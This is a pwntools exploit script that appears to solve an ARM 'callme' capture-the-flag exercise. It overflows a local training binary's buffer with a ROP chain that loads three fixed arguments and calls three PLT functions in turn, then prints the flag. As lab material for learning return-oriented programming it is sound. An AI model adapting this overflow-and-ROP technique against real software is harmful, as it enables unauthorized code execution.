from pwn import *

BINARY = "./callme_armv5-hf"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY

p = process(BINARY)

pop_r012_lr_pc = p32(0x10870) # pop {r0, r1, r2, lr, pc}
callme_one     = p32(0x10624) # <callme_one@plt>
callme_two     = p32(0x10678) # <callme_two@plt>
callme_three   = p32(0x10618) # <callme_three@plt>

for func in [callme_one, callme_two, callme_three]:
    rop = b"A" * 36
    rop += pop_r012_lr_pc
    rop += p32(0xdeadbeef)
    rop += p32(0xcafebabe)
    rop += p32(0xd00df00d)
    rop += p32(ELF.symbols["pwnme"])
    rop += func
    
    p.sendline(rop)
    log.success(f"ROPchain = {rop}")

flag = p.recvall(timeout=1).split(b'\n')[-2]
log.success(f"FLAG : {flag}")
